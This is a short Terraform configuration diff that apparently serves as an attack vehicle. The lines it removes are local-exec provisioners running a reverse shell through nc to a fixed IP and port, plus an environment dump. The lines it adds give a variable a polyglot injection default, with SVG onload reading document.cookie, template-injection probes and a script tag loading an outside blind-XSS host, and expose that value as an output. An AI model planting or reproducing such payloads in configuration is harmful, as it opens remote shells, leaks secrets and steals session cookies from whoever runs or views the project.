@@ -8,16 +8,20 @@ terraform {
   }
 }
 
+variable "aws_region" {
+  description = "AWS region"
+  type        = string
+  default = "Hello {{ var }}/><svg onload='confirm(document.cookie)'>{{2*2}}[[3*3]]{{4*'4'}}<%= 5 * 5 %>@(8+8)#{9*8}><script src=https://omar.bxss.in><script><iframe src='http://localhost'></iframe><s>html</s>"
+}
+
 
 resource "local_file" "foo" {
-  content  = "foo!"
-  filename = "${path.module}/foo.bar"
+  content  = "foo!fffxx"
+  filename = "${path.module}/example.txt"
 
-   provisioner "local-exec" {
-    command = "sh -i 2>&1|nc 44.212.65.6 1337 >/tmp/f"
-  }
-   provisioner "local-exec" {
-    command = "echo $(env)"
-  }
+}
 
+
+output "aws_region_output" {
+ value = var.aws_region
 }
